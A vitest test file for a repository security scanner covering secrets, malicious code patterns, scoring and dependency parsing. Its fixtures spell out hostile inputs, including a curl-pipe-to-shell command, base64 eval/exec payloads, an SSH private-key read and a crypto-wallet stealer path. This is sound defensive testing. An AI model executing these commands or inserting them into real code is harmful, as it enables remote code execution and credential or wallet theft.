import { describe, it, expect } from "vitest";
import { scanSecretsText } from "../src/scanners/secrets";
import { scanPatternsText } from "../src/scanners/patterns";
import { scoreFindings } from "../src/score";

describe("secrets scanner", () => {
  it("flags an AWS access key id", () => {
    const f = scanSecretsText("config.js", 'const k = "AKIAJ7XYZ2LMNOPQ4RST";');
    expect(f.some((x) => x.title.includes("AWS access key"))).toBe(true);
  });

  it("ignores the canonical AWS example key and placeholders", () => {
    expect(scanSecretsText("config.js", 'k = "AKIAIOSFODNN7EXAMPLE"').length).toBe(0);
    expect(scanSecretsText("a.env", 'API_KEY="your-api-key-goes-here1"').length).toBe(0);
    expect(scanSecretsText("c.js", 'token = "xxxxxxxxxxxxxxxxxxxx"').length).toBe(0);
  });

  it("flags a GitHub PAT", () => {
    const f = scanSecretsText("a.env", "GH=ghp_R7kZ9pQ2wX5vL8mN3jH6tY4bC1dF0aGsErUu");
    expect(f.some((x) => x.title.includes("GitHub personal"))).toBe(true);
  });

  it("flags a private key block", () => {
    const f = scanSecretsText("id_rsa", "-----BEGIN OPENSSH PRIVATE KEY-----\nabc\n");
    expect(f.some((x) => x.severity === "critical")).toBe(true);
  });

  it("treats a committed .key/.pem cert file as a review-level finding, not critical", () => {
    const mojo = scanSecretsText("t/mojo/certs/server.key", "-----BEGIN PRIVATE KEY-----\nabc\n");
    expect(mojo[0].severity).toBe("medium");
    const grafana = scanSecretsText("devenv/docker/auth/key.pem", "-----BEGIN PRIVATE KEY-----\nabc\n");
    expect(grafana[0].severity).toBe("medium");
  });

  it("keeps a private key in a .env or named-secret file critical", () => {
    const env = scanSecretsText(".env.production", "-----BEGIN RSA PRIVATE KEY-----\nabc\n");
    expect(env[0].severity).toBe("critical");
  });

  it("treats a private key in source as an example, not a leak", () => {
    const f = scanSecretsText(
      "ext/tls/lib.rs",
      '/// Starts with -----BEGIN PRIVATE KEY-----\n',
    );
    expect(f[0].title).toContain("Private key");
    expect(f[0].severity).toBe("medium");
  });

  it("dampens secrets in test/example paths", () => {
    const real = scanSecretsText("src/k.js", 'k="AKIAJ7XYZ2LMNOPQ4RST"');
    const test = scanSecretsText("tests/k.js", 'k="AKIAJ7XYZ2LMNOPQ4RST"');
    expect(real[0].severity).toBe("high");
    expect(test[0].severity).toBe("low");
  });

  it("does not flag a clean file", () => {
    expect(scanSecretsText("a.js", "const x = 1 + 2;\n").length).toBe(0);
  });
});

describe("patterns scanner", () => {
  it("flags obfuscated eval(atob(...))", () => {
    const f = scanPatternsText("x.js", "eval(atob('ZWNobyBoaQ=='))");
    expect(f.some((x) => x.severity === "critical")).toBe(true);
  });

  it("flags python exec of base64", () => {
    const f = scanPatternsText("m.py", "exec(base64.b64decode(payload))");
    expect(f.some((x) => x.title.includes("Python exec"))).toBe(true);
  });

  it("flags curl | sh", () => {
    const f = scanPatternsText("install.sh", "curl http://x.io/i | sh");
    expect(f.some((x) => x.title.includes("Pipe remote"))).toBe(true);
  });

  it("flags npm install hooks in package.json", () => {
    const f = scanPatternsText("package.json", '{"scripts":{"postinstall":"node steal.js"}}');
    expect(f.some((x) => x.title.includes("install lifecycle"))).toBe(true);
  });

  it("flags ssh key reads", () => {
    const f = scanPatternsText("s.py", 'open("~/.ssh/id_rsa").read()');
    expect(f.some((x) => x.title.includes("SSH"))).toBe(true);
  });
});

describe("scoring", () => {
  it("clean repo scores clean", () => {
    expect(scoreFindings([]).level).toBe("clean");
  });

  it("a critical finding scores critical", () => {
    const s = scoreFindings([
      {
        severity: "critical",
        category: "secret",
        title: "x",
        file: "a",
        detail: "",
      },
    ]);
    expect(s.level).toBe("critical");
  });
});

describe("patterns comment dampening", () => {
  it("downgrades a sensitive path that sits in a comment", () => {
    const f = scanPatternsText("cli/pack.rs", "/// guards against a symlink to ~/.ssh/id_rsa here\n");
    expect(f.length).toBe(1);
    expect(f[0].severity).toBe("info");
    expect(f[0].title).toContain("comment");
  });
  it("still flags a real eval in code", () => {
    const f = scanPatternsText("a.js", "eval(atob('payload'))\n");
    expect(f[0].severity).toBe("critical");
  });
  it("does not flag the bare word MetaMask in UI or localization text", () => {
    const f = scanPatternsText(
      "app/_locales/en/messages.json",
      '{ "appName": { "message": "MetaMask" }, "intro": { "message": "Connect your Electrum wallet" } }',
    );
    expect(f.some((x) => x.title.includes("wallet"))).toBe(false);
  });
  it("flags a wallet stealer reaching into profile storage", () => {
    const f = scanPatternsText(
      "stealer.py",
      'path = os.path.expanduser("~/AppData/Roaming/Exodus/exodus.wallet")',
    );
    expect(f.some((x) => x.title.includes("wallet storage"))).toBe(true);
  });
  it("downgrades eval inside vendored third-party code", () => {
    const f = scanPatternsText(
      "vendor/firebug-lite/src/debug.js",
      "value = eval(unescape(parts[1]));\n",
    );
    expect(f[0].severity).toBe("low");
    expect(f[0].title).toContain("vendored");
  });
});

import { parseManifest } from "../src/scanners/deps";
import { isLowSignalPath } from "../src/util";

describe("dependency parsing accuracy", () => {
  it("resolves npm aliases to the real package, not the alias key", () => {
    const deps = parseManifest("package.json", JSON.stringify({
      dependencies: { "eslint-v7": "npm:eslint@7.7.0", "scheduler-0-13": "npm:scheduler@0.13.0" },
    }));
    expect(deps.map((d) => d.name).sort()).toEqual(["eslint", "scheduler"]);
  });
  it("skips workspace, file and link specs", () => {
    const deps = parseManifest("package.json", JSON.stringify({
      dependencies: { a: "workspace:*", b: "file:../b", c: "link:../c", d: "1.2.3" },
    }));
    expect(deps.map((d) => d.name)).toEqual(["d"]);
  });
});

describe("low-signal path detection", () => {
  it("treats co-located test files as low signal", () => {
    expect(isLowSignalPath("pkg/login/connectors/oauth_test.go")).toBe(true);
    expect(isLowSignalPath("src/foo.test.ts")).toBe(true);
    expect(isLowSignalPath("tests/test_login.py")).toBe(true);
    expect(isLowSignalPath("src/latest.js")).toBe(false);
    expect(isLowSignalPath("src/app.ts")).toBe(false);
  });
});

describe("generic credential rejects wordy values", () => {
  it("does not flag theme/scope tokens as credentials", () => {
    const f = scanSecretsText("theme.ts", "token: 'keyword.operator.class',");
    expect(f.some((x) => x.title === "Hardcoded credential")).toBe(false);
  });
});

describe("install hooks and dev-dep calibration", () => {
  it("treats an npm install hook as info, never a danger driver", () => {
    const f = scanPatternsText("package.json", '{"scripts":{"postinstall":"node build.js"}}');
    const hook = f.find((x) => x.title.includes("install lifecycle"));
    expect(hook && hook.severity).toBe("info");
  });
});

describe("lockfiles and generated files are low signal", () => {
  it("dampens lockfiles, minified bundles, source maps and generated code", () => {
    ["package-lock.json", "yarn.lock", "pnpm-lock.yaml", "Cargo.lock", "go.sum",
     "dist/app.min.js", "dist/app.js.map", "api/service.pb.go", "x_pb2.py"]
      .forEach((p) => expect(isLowSignalPath(p)).toBe(true));
    ["src/app.js", "src/lock.ts", "go.mod"].forEach((p) => expect(isLowSignalPath(p)).toBe(false));
  });
});
